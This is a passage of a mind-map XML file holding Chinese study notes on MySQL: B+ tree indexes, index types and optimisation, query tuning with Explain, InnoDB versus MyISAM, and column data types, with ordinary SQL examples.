      进行查找操作时，首先在根节点进行二分查找，找到一个 key 所在的指针，然后递归地在指针所指向的节点进行查找。直到查找到叶子节点，然后在叶子节点上进行二分查找，找出 key 所对应的 data。
    </p>
    <p dir="auto">
      插入删除操作会破坏平衡树的平衡性，因此在进行插入删除操作之后，需要对树进行分裂、合并、旋转等操作来维护平衡性。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1574663929" CREATED="1754750563765" MODIFIED="1754750563767"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 与红黑树的比较
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 与红黑树的比较" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#3-与红黑树的比较">
</a>
    <p dir="auto">
      红黑树等平衡树也可以用来实现索引，但是文件系统及数据库系统普遍采用 B+ Tree 作为索引结构，这是因为使用 B+ 树访问磁盘数据有更高的性能。
    </p>
    <p dir="auto">
      （一）B+ 树有更低的树高
    </p>
    <p dir="auto">
      平衡树的树高 O(h)=O(log<sub>d</sub>N)，其中 d 为每个节点的出度。红黑树的出度为 2，而 B+ Tree 的出度一般都非常大，所以红黑树的树高 h 很明显比 B+ Tree 大非常多。
    </p>
    <p dir="auto">
      （二）磁盘访问原理
    </p>
    <p dir="auto">
      操作系统一般将内存和磁盘分割成固定大小的块，每一块称为一页，内存与磁盘以页为单位交换数据。数据库系统将索引的一个节点的大小设置为页的大小，使得一次 I/O 就能完全载入一个节点。
    </p>
    <p dir="auto">
      如果数据不在同一个磁盘块上，那么通常需要移动制动手臂进行寻道，而制动手臂因为其物理结构导致了移动效率低下，从而增加磁盘数据读取时间。B+ 树相对于红黑树有更低的树高，进行寻道的次数与树高成正比，在同一个磁盘块上进行访问只需要很短的磁盘旋转时间，所以 B+ 树更适合磁盘数据的读取。
    </p>
    <p dir="auto">
      （三）磁盘预读特性
    </p>
    <p dir="auto">
      为了减少磁盘 I/O 操作，磁盘往往不是严格按需读取，而是每次都会预读。预读过程中，磁盘进行顺序读取，顺序读取不需要进行磁盘寻道，并且只需要很短的磁盘旋转时间，速度会非常快。并且可以利用预读特性，相邻的节点也能够被预先载入。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_191734593" CREATED="1754750563768" MODIFIED="1754750563769"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      MySQL 索引
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: MySQL 索引" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#mysql-索引">
</a>
    <p dir="auto">
      索引是在存储引擎层实现的，而不是在服务器层实现的，所以不同存储引擎具有不同的索引类型和实现。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1372351563" CREATED="1754750563769" MODIFIED="1754750563771"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. B+Tree 索引
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. B+Tree 索引" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#1-btree-索引">
</a>
    <p dir="auto">
      是大多数 MySQL 存储引擎的默认索引类型。
    </p>
    <p dir="auto">
      因为不再需要进行全表扫描，只需要对树进行搜索即可，所以查找速度快很多。
    </p>
    <p dir="auto">
      因为 B+ Tree 的有序性，所以除了用于查找，还可以用于排序和分组。
    </p>
    <p dir="auto">
      可以指定多个列作为索引列，多个索引列共同组成键。
    </p>
    <p dir="auto">
      适用于全键值、键值范围和键前缀查找，其中键前缀查找只适用于最左前缀查找。如果不是按照索引列的顺序进行查找，则无法使用索引。
    </p>
    <p dir="auto">
      InnoDB 的 B+Tree 索引分为主索引和辅助索引。主索引的叶子节点 data 域记录着完整的数据记录，这种索引方式被称为聚簇索引。因为无法把数据行存放在两个不同的地方，所以一个表只能有一个聚簇索引。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d16047f6cc2f8df6b8eadea166ff258427bc0a6664e1a7599c13c10ffb631afe/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f34353031366539382d363837392d343730392d383536392d3236326232643664363062392e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/d16047f6cc2f8df6b8eadea166ff258427bc0a6664e1a7599c13c10ffb631afe/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f34353031366539382d363837392d343730392d383536392d3236326232643664363062392e706e67" width="350px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/45016e98-6879-4709-8569-262b2d6d60b9.png"/>
    </a><br/>
    

    <p dir="auto">
      辅助索引的叶子节点的 data 域记录着主键的值，因此在使用辅助索引进行查找时，需要先查找到主键值，然后再到主索引中进行查找。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/25c7b227b1de3bc59399b17715babb5202d2a479c9ed88f7273c55beb94fa442/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f37633334396239312d303530622d346437322d613766382d6563383633323033303765612e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/25c7b227b1de3bc59399b17715babb5202d2a479c9ed88f7273c55beb94fa442/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f37633334396239312d303530622d346437322d613766382d6563383633323033303765612e706e67" width="350px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7c349b91-050b-4d72-a7f8-ec86320307ea.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_861365180" CREATED="1754750563772" MODIFIED="1754750563773"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 哈希索引
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 哈希索引" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#2-哈希索引">
</a>
    <p dir="auto">
      哈希索引能以 O(1) 时间进行查找，但是失去了有序性：
    </p>
    <ul dir="auto">
      <li>
        无法用于排序与分组；
      </li>
      <li>
        只支持精确查找，无法用于部分查找和范围查找。
      </li>
    </ul>
    <p dir="auto">
      InnoDB 存储引擎有一个特殊的功能叫“自适应哈希索引”，当某个索引值被使用的非常频繁时，会在 B+Tree 索引之上再创建一个哈希索引，这样就让 B+Tree 索引具有哈希索引的一些优点，比如快速的哈希查找。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_713861029" CREATED="1754750563774" MODIFIED="1754750563775"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 全文索引
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 全文索引" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#3-全文索引">
</a>
    <p dir="auto">
      MyISAM 存储引擎支持全文索引，用于查找文本中的关键词，而不是直接比较是否相等。
    </p>
    <p dir="auto">
      查找条件使用 MATCH AGAINST，而不是普通的 WHERE。
    </p>
    <p dir="auto">
      全文索引使用倒排索引实现，它记录着关键词到其所在文档的映射。
    </p>
    <p dir="auto">
      InnoDB 存储引擎在 MySQL 5.6.4 版本中也开始支持全文索引。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1551052851" CREATED="1754750563777" MODIFIED="1754750563780"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 空间数据索引
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 空间数据索引" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#4-空间数据索引">
</a>
    <p dir="auto">
      MyISAM 存储引擎支持空间数据索引（R-Tree），可以用于地理数据存储。空间数据索引会从所有维度来索引数据，可以有效地使用任意维度来进行组合查询。
    </p>
    <p dir="auto">
      必须使用 GIS 相关的函数来维护数据。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1949005804" CREATED="1754750563780" MODIFIED="1754750563780"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      索引优化
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_745599554" CREATED="1754750563782" MODIFIED="1754750563783"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 独立的列
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 独立的列" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#1-独立的列">
</a>
    <p dir="auto">
      在进行查询时，索引列不能是表达式的一部分，也不能是函数的参数，否则无法使用索引。
    </p>
    <p dir="auto">
      例如下面的查询不能使用 actor_id 列的索引：
    </p>
    <pre>SELECT actor_id FROM sakila.actor WHERE actor_id + 1 = 5;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_802921207" CREATED="1754750563784" MODIFIED="1754750563786"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 多列索引
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 多列索引" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#2-多列索引">
</a>
    <p dir="auto">
      在需要使用多个列作为条件进行查询时，使用多列索引比使用多个单列索引性能更好。例如下面的语句中，最好把 actor_id 和 film_id 设置为多列索引。
    </p>
    <pre>SELECT film_id, actor_ id FROM sakila.film_actor
WHERE actor_id = 1 AND film_id = 1;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1941481884" CREATED="1754750563786" MODIFIED="1754750563787"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 索引列的顺序
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 索引列的顺序" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#3-索引列的顺序">
</a>
    <p dir="auto">
      让选择性最强的索引列放在前面。
    </p>
    <p dir="auto">
      索引的选择性是指：不重复的索引值和记录总数的比值。最大值为 1，此时每个记录都有唯一的索引与其对应。选择性越高，每个记录的区分度越高，查询效率也越高。
    </p>
    <p dir="auto">
      例如下面显示的结果中 customer_id 的选择性比 staff_id 更高，因此最好把 customer_id 列放在多列索引的前面。
    </p>
    <pre>SELECT COUNT(DISTINCT staff_id)/COUNT(*) AS staff_id_selectivity,
COUNT(DISTINCT customer_id)/COUNT(*) AS customer_id_selectivity,
COUNT(*)
FROM payment;</pre>
    <pre>   staff_id_selectivity: 0.0001
customer_id_selectivity: 0.0373
               COUNT(*): 16049</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_209622572" CREATED="1754750563788" MODIFIED="1754750563790"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 前缀索引
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 前缀索引" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#4-前缀索引">
</a>
    <p dir="auto">
      对于 BLOB、TEXT 和 VARCHAR 类型的列，必须使用前缀索引，只索引开始的部分字符。
    </p>
    <p dir="auto">
      前缀长度的选取需要根据索引选择性来确定。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1903295696" CREATED="1754750563790" MODIFIED="1754750563792"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 覆盖索引
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5. 覆盖索引" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#5-覆盖索引">
</a>
    <p dir="auto">
      索引包含所有需要查询的字段的值。
    </p>
    <p dir="auto">
      具有以下优点：
    </p>
    <ul dir="auto">
      <li>
        索引通常远小于数据行的大小，只读取索引能大大减少数据访问量。
      </li>
      <li>
        一些存储引擎（例如 MyISAM）在内存中只缓存索引，而数据依赖于操作系统来缓存。因此，只访问索引可以不使用系统调用（通常比较费时）。
      </li>
      <li>
        对于 InnoDB 引擎，若辅助索引能够覆盖查询，则无需访问主索引。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_495983137" CREATED="1754750563792" MODIFIED="1754750563794"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      索引的优点
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 索引的优点" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#索引的优点">
</a>
    <ul dir="auto">
      <li>
        <p dir="auto">
          大大减少了服务器需要扫描的数据行数。
        </p>
      </li>
      <li>
        <p dir="auto">
          帮助服务器避免进行排序和分组，以及避免创建临时表（B+Tree 索引是有序的，可以用于 ORDER BY 和 GROUP BY 操作。临时表主要是在排序和分组过程中创建，不需要排序和分组，也就不需要创建临时表）。
        </p>
      </li>
      <li>
        <p dir="auto">
          将随机 I/O 变为顺序 I/O（B+Tree 索引是有序的，会将相邻的数据都存储在一起）。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1065125383" CREATED="1754750563794" MODIFIED="1754750563796"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      索引的使用条件
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 索引的使用条件" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#索引的使用条件">
</a>
    <ul dir="auto">
      <li>
        <p dir="auto">
          对于非常小的表、大部分情况下简单的全表扫描比建立索引更高效；
        </p>
      </li>
      <li>
        <p dir="auto">
          对于中到大型的表，索引就非常有效；
        </p>
      </li>
      <li>
        <p dir="auto">
          但是对于特大型的表，建立和维护索引的代价将会随之增长。这种情况下，需要用到一种技术可以直接区分出需要查询的一组数据，而不是一条记录一条记录地匹配，例如可以使用分区技术。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1939085327" CREATED="1754750563796" MODIFIED="1754750563796"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、查询性能优化
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1634491360" CREATED="1754750563798" MODIFIED="1754750563799"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      使用 Explain 进行分析
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 使用 Explain 进行分析" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#使用-explain-进行分析">
</a>
    <p dir="auto">
      Explain 用来分析 SELECT 查询语句，开发人员可以通过分析 Explain 结果来优化查询语句。
    </p>
    <p dir="auto">
      比较重要的字段有：
    </p>
    <ul dir="auto">
      <li>
        select_type : 查询类型，有简单查询、联合查询、子查询等
      </li>
      <li>
        key : 使用的索引
      </li>
      <li>
        rows : 扫描的行数
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_960642587" CREATED="1754750563800" MODIFIED="1754750563800"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      优化数据访问
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_504175210" CREATED="1754750563801" MODIFIED="1754750563803"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 减少请求的数据量
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 减少请求的数据量" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#1-减少请求的数据量">
</a>
    <ul dir="auto">
      <li>
        只返回必要的列：最好不要使用 SELECT * 语句。
      </li>
      <li>
        只返回必要的行：使用 LIMIT 语句来限制返回的数据。
      </li>
      <li>
        缓存重复查询的数据：使用缓存可以避免在数据库中进行查询，特别在要查询的数据经常被重复查询时，缓存带来的查询性能提升将会是非常明显的。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_872426669" CREATED="1754750563803" MODIFIED="1754750563805"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 减少服务器端扫描的行数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 减少服务器端扫描的行数" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#2-减少服务器端扫描的行数">
</a>
    <p dir="auto">
      最有效的方式是使用索引来覆盖查询。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1530262943" CREATED="1754750563805" MODIFIED="1754750563805"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      重构查询方式
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_125727992" CREATED="1754750563807" MODIFIED="1754750563808"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 切分大查询
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 切分大查询" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#1-切分大查询">
</a>
    <p dir="auto">
      一个大查询如果一次性执行的话，可能一次锁住很多数据、占满整个事务日志、耗尽系统资源、阻塞很多小的但重要的查询。
    </p>
    <pre>DELETE FROM messages WHERE create &lt; DATE_SUB(NOW(), INTERVAL 3 MONTH);</pre>
    <pre>rows_affected = 0
do {
    rows_affected = do_query(
    &quot;DELETE FROM messages WHERE create  &lt; DATE_SUB(NOW(), INTERVAL 3 MONTH) LIMIT 10000&quot;)
} while rows_affected &gt; 0</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1938362616" CREATED="1754750563809" MODIFIED="1754750563810"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 分解大连接查询
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 分解大连接查询" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#2-分解大连接查询">
</a>
    <p dir="auto">
      将一个大连接查询分解成对每一个表进行一次单表查询，然后在应用程序中进行关联，这样做的好处有：
    </p>
    <ul dir="auto">
      <li>
        让缓存更高效。对于连接查询，如果其中一个表发生变化，那么整个查询缓存就无法使用。而分解后的多个查询，即使其中一个表发生变化，对其它表的查询缓存依然可以使用。
      </li>
      <li>
        分解成多个单表查询，这些单表查询的缓存结果更可能被其它查询使用到，从而减少冗余记录的查询。
      </li>
      <li>
        减少锁竞争；
      </li>
      <li>
        在应用层进行连接，可以更容易对数据库进行拆分，从而更容易做到高性能和可伸缩。
      </li>
      <li>
        查询本身效率也可能会有所提升。例如下面的例子中，使用 IN() 代替连接查询，可以让 MySQL 按照 ID 顺序进行查询，这可能比随机的连接要更高效。
      </li>
    </ul>
    <pre>SELECT * FROM tag
JOIN tag_post ON tag_post.tag_id=tag.id
JOIN post ON tag_post.post_id=post.id
WHERE tag.tag='mysql';</pre>
    <pre>SELECT * FROM tag WHERE tag='mysql';
SELECT * FROM tag_post WHERE tag_id=1234;
SELECT * FROM post WHERE post.id IN (123,456,567,9098,8904);</pre>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node ID="ID_155130014" CREATED="1754750563811" MODIFIED="1754750563811"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、存储引擎
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_637643086" CREATED="1754750563814" MODIFIED="1754750563815"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      InnoDB
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: InnoDB" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#innodb">
</a>
    <p dir="auto">
      是 MySQL 默认的事务型存储引擎，只有在需要它不支持的特性时，才考虑使用其它存储引擎。
    </p>
    <p dir="auto">
      实现了四个标准的隔离级别，默认级别是可重复读（REPEATABLE READ）。在可重复读隔离级别下，通过多版本并发控制（MVCC）+ Next-Key Locking 防止幻影读。
    </p>
    <p dir="auto">
      主索引是聚簇索引，在索引中保存了数据，从而避免直接读取磁盘，因此对查询性能有很大的提升。
    </p>
    <p dir="auto">
      内部做了很多优化，包括从磁盘读取数据时采用的可预测性读、能够加快读操作并且自动创建的自适应哈希索引、能够加速插入操作的插入缓冲区等。
    </p>
    <p dir="auto">
      支持真正的在线热备份。其它存储引擎不支持在线热备份，要获取一致性视图需要停止对所有表的写入，而在读写混合场景中，停止写入可能也意味着停止读取。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1114426275" CREATED="1754750563816" MODIFIED="1754750563818"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      MyISAM
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: MyISAM" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#myisam">
</a>
    <p dir="auto">
      设计简单，数据以紧密格式存储。对于只读数据，或者表比较小、可以容忍修复操作，则依然可以使用它。
    </p>
    <p dir="auto">
      提供了大量的特性，包括压缩表、空间数据索引等。
    </p>
    <p dir="auto">
      不支持事务。
    </p>
    <p dir="auto">
      不支持行级锁，只能对整张表加锁，读取时会对需要读到的所有表加共享锁，写入时则对表加排它锁。但在表有读取操作的同时，也可以往表中插入新的记录，这被称为并发插入（CONCURRENT INSERT）。
    </p>
    <p dir="auto">
      可以手工或者自动执行检查和修复操作，但是和事务恢复以及崩溃恢复不同，可能导致一些数据丢失，而且修复操作是非常慢的。
    </p>
    <p dir="auto">
      如果指定了 DELAY_KEY_WRITE 选项，在每次修改执行完成时，不会立即将修改的索引数据写入磁盘，而是会写到内存中的键缓冲区，只有在清理键缓冲区或者关闭表的时候才会将对应的索引块写入磁盘。这种方式可以极大的提升写入性能，但是在数据库或者主机崩溃时会造成索引损坏，需要执行修复操作。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1323133894" CREATED="1754750563818" MODIFIED="1754750563820"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      比较
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 比较" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#比较">
</a>
    <ul dir="auto">
      <li>
        <p dir="auto">
          事务：InnoDB 是事务型的，可以使用 Commit 和 Rollback 语句。
        </p>
      </li>
      <li>
        <p dir="auto">
          并发：MyISAM 只支持表级锁，而 InnoDB 还支持行级锁。
        </p>
      </li>
      <li>
        <p dir="auto">
          外键：InnoDB 支持外键。
        </p>
      </li>
      <li>
        <p dir="auto">
          备份：InnoDB 支持在线热备份。
        </p>
      </li>
      <li>
        <p dir="auto">
          崩溃恢复：MyISAM 崩溃后发生损坏的概率比 InnoDB 高很多，而且恢复的速度也更慢。
        </p>
      </li>
      <li>
        <p dir="auto">
          其它特性：MyISAM 支持压缩表和空间数据索引。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1534880075" CREATED="1754750563820" MODIFIED="1754750563820"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      四、数据类型
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_325042160" CREATED="1754750563822" MODIFIED="1754750563824"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      整型
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 整型" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#整型">
</a>
    <p dir="auto">
      TINYINT, SMALLINT, MEDIUMINT, INT, BIGINT 分别使用 8, 16, 24, 32, 64 位存储空间，一般情况下越小的列越好。
    </p>
    <p dir="auto">
      INT(11) 中的数字只是规定了交互工具显示字符的个数，对于存储和计算来说是没有意义的。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1054677042" CREATED="1754750563824" MODIFIED="1754750563825"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      浮点数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 浮点数" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#浮点数">
</a>
    <p dir="auto">
      FLOAT 和 DOUBLE 为浮点类型，DECIMAL 为高精度小数类型。CPU 原生支持浮点运算，但是不支持 DECIMAl 类型的计算，因此 DECIMAL 的计算比浮点类型需要更高的代价。
    </p>
    <p dir="auto">
      FLOAT、DOUBLE 和 DECIMAL 都可以指定列宽，例如 DECIMAL(18, 9) 表示总共 18 位，取 9 位存储小数部分，剩下 9 位存储整数部分。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_976906960" CREATED="1754750563826" MODIFIED="1754750563827"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      字符串
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 字符串" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#字符串">
</a>
    <p dir="auto">
      主要有 CHAR 和 VARCHAR 两种类型，一种是定长的，一种是变长的。
    </p>
    <p dir="auto">
      VARCHAR 这种变长类型能够节省空间，因为只需要存储必要的内容。但是在执行 UPDATE 时可能会使行变得比原来长，当超出一个页所能容纳的大小时，就要执行额外的操作。MyISAM 会将行拆成不同的片段存储，而 InnoDB 则需要分裂页来使行放进页内。
    </p>
    <p dir="auto">
      在进行存储和检索时，会保留 VARCHAR 末尾的空格，而会删除 CHAR 末尾的空格。
    </p>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1564873520" CREATED="1754750563827" MODIFIED="1754750563829"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      时间和日期
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 时间和日期" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#时间和日期">
</a>
    <p dir="auto">
      MySQL 提供了两种相似的日期时间类型：DATETIME 和 TIMESTAMP。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1670192122" CREATED="1754750563829" MODIFIED="1754750563831"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. DATETIME
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. DATETIME" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#1-datetime">
</a>
    <p dir="auto">
      能够保存从 1000 年到 9999 年的日期和时间，精度为秒，使用 8 字节的存储空间。
    </p>
    <p dir="auto">
      它与时区无关。
    </p>
    <p dir="auto">
      默认情况下，MySQL 以一种可排序的、无歧义的格式显示 DATETIME 值，例如“2008-01-16 22:37:08”，这是 ANSI 标准定义的日期和时间表示方法。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_333991910" CREATED="1754750563831" MODIFIED="1754750563834"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. TIMESTAMP
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. TIMESTAMP" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/MySQL.md#2-timestamp">
</a>
    <p dir="auto">
      和 UNIX 时间戳相同，保存从 1970 年 1 月 1 日午夜（格林威治时间）以来的秒数，使用 4 个字节，只能表示从 1970 年到 2038 年。
    </p>
    <p dir="auto">
      它和时区有关，也就是说一个时间戳在不同的时区所代表的具体时间是不同的。
    </p>
    <p dir="auto">
      MySQL 提供了 FROM_UNIXTIME() 函数把 UNIX 时间戳转换为日期，并提供了 UNIX_TIMESTAMP() 函数把日期转换为 UNIX 时间戳。
    </p>
    <p dir="auto">
      默认情况下，如果插入时没有指定 TIMESTAMP 列的值，会将这个值设置为当前时间。
    </p>
    <p dir="auto">
